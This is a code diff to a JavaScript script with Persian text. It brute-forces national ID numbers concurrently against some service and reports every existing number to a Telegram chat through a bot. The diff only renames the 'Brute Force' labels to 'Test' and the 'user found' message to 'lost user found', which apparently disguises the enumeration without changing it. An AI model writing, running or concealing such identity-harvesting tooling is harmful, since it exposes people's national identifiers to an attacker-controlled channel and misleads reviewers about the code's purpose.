@@ -69,13 +69,13 @@ async function processBatch(nationalNumbers) {
 }
 
 // ===============================
-// تابع اصلی Brute Force با همزمانی
+// تابع اصلی Test با همزمانی
 // ===============================
 async function bruteForceAll(start, end, concurrent = 10) {
-  console.log(`⚡ Brute Force شروع شد (${concurrent} درخواست همزمان)`);
+  console.log(`⚡ Test شروع شد (${concurrent} درخواست همزمان)`);
   bot.sendMessage(
     CHAT_ID,
-    `🚀 عملیات Brute Force شروع شد!\n⚡ همزمانی: ${concurrent}`
+    `🚀 عملیات Test شروع شد!\n⚡ همزمانی: ${concurrent}`
   );
 
   let count = 0;
@@ -99,7 +99,7 @@ async function bruteForceAll(start, end, concurrent = 10) {
 
         if (exists) {
           foundCount++;
-          const msg = `🎯 کاربر پیدا شد:\n<code>${nationalNo}</code>`;
+          const msg = `🎯 کاربر گم شده پیدا شد:\n<code>${nationalNo}</code>`;
           console.log(msg);
           bot.sendMessage(CHAT_ID, msg, { parse_mode: "HTML" });
         }
